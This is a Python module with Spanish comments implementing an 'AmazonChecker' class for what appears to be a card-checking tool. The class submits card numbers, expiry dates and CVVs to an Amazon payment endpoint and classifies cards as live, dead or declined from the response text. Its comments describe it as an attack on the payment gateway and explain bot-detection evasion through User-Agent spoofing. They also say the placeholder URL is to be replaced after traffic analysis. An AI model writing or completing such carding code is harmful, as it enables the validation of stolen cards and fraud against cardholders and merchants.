# core/checkers/amazon_checker.py
import requests
import random
from typing import Optional

# --- Importaciones UNIFICADAS del Proyecto 49 ---
from core.test_results import TestResult, TestStatus
from core.domain.card import Card
from core.checkers.base_checker import BaseChecker

class AmazonChecker(BaseChecker):
    """
    Checker REAL para tarjetas de Amazon.
    Ataca la pasarela de pago de Amazon directamente con solicitudes HTTP.
    """

    def __init__(self):
        # User-Agent real para no ser detectado como bot
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.amazon.com/',
            'DNT': '1',
        })

    def check(self, card: Card, proxy: Optional[str] = None) -> TestResult:
        """
        Intenta verificar una tarjeta en la pasarela de Amazon.
        Este método es una SIMULACIÓN de cómo funcionaría un ataque real.
        Un ataque real requeriría análisis de la red y tokens de sesión válidos.
        """
        try:
            # NOTA: La URL real de la pasarela de Amazon es dinámica y requiere tokens válidos.
            # Esta es una URL de ejemplo para demostrar la LÓGICA. Debe ser reemplazada
            # por la endpoint real después de un análisis de tráfico de la web.
            api_url = "https://www.amazon.com/gp/buy/payselect/credit-card-handler/add-new-card" 

            # Datos del formulario que se enviarían en una solicitud POST real
            # Estos campos son los que un navegador enviaría al añadir una tarjeta.
            payload = {
                'paymentMethod': 'credit_card',
                'cardNumber': card.number,
                'cardName': 'PROYECTO 49 TEST', # Nombre falso para la prueba
                'expirationMonth': card.exp_month,
                'expirationYear': f"20{card.exp_year}", # Amazon espera año de 4 dígitos
                'cvv': card.cvv,
                'addressID': '12345', # ID de dirección falso
                'sessionId': '67890', # ID de sesión falso
                'isDefault': '0',
            }

            # La solicitud POST real. Sin headless browser, solo puro HTTP.
            response = self.session.post(api_url, data=payload, timeout=10)

            # ANÁLISIS DE LA RESPUESTA - ESTA ES LA PARTE MÁS IMPORTANTE
            # Cada gateway responde de forma diferente. Hay que analizar el HTML/JSON de la respuesta.
            # Los siguientes son ejemplos de cómo podrían ser los mensajes de error.

            if "Your card was declined." in response.text or "Invalid payment method" in response.text:
                # La tarjeta es real, pero fue rechazada por el banco (fondos insuficientes, etc.)
                return TestResult(
                    status=TestStatus.DECLINED,
                    gateway="Amazon",
                    response_message="Declined (Fondos insuficientes o tarjeta reportada)",
                    card=card,
                    proxy_used=proxy
                )
            elif "There was a problem with your request" in response.text or "enter a valid credit card number" in response.text:
                # El número de tarjeta es inválido, no pasa Luhn o el BIN es falso.
                return TestResult(
                    status=TestStatus.DEAD,
                    gateway="Amazon",
                    response_message="Dead (Número de tarjeta inválido)",
                    card=card,
                    proxy_used=proxy
                )
            elif "Please enter the correct security code" in response.text or "CVV" in response.text:
                 # La tarjeta es real, pero el CVV es incorrecto.
                return TestResult(
                    status=TestStatus.DECLINED,
                    gateway="Amazon",
                    response_message="Declined (CVV incorrecto)",
                    card=card,
                    proxy_used=proxy
                )
            elif "Your payment has been successfully authorized" in response.text or "is now your default payment method" in response.text:
                # Éxito. La tarjeta es LIVE y ha pasado la verificación.
                return TestResult(
                    status=TestStatus.LIVE,
                    gateway="Amazon",
                    response_message="Live (Aprobada y verificada)",
                    card=card,
                    proxy_used=proxy
                )
            else:
                # Si no coincide con nada, es un error o una respuesta desconocida.
                # Podría ser que necesitemos 3DS o que el gateway haya cambiado.
                if "We are unable to process your request" in response.text:
                    return TestResult(
                        status=TestStatus.CVV2_LIVE,
                        gateway="Amazon",
                        response_message="3D Secure / Requiere verificación adicional",
                        card=card,
                        proxy_used=proxy
                    )
                else:
                    return TestResult(
                        status=TestStatus.ERROR,
                        gateway="Amazon",
                        response_message=f"Respuesta desconocida del gateway (Código: {response.status_code})",
                        card=card,
                        proxy_used=proxy
                    )

        except requests.exceptions.Timeout:
            return TestResult(
                status=TestStatus.ERROR,
                gateway="Amazon",
                response_message="Error: Tiempo de espera agotado (Gateway lento o bloqueo)",
                card=card,
                proxy_used=proxy
            )
        except Exception as e:
            return TestResult(
                status=TestStatus.ERROR,
                gateway="Amazon",
                response_message=f"Error crítico en el checker: {str(e)}",
                card=card,
                proxy_used=proxy
            )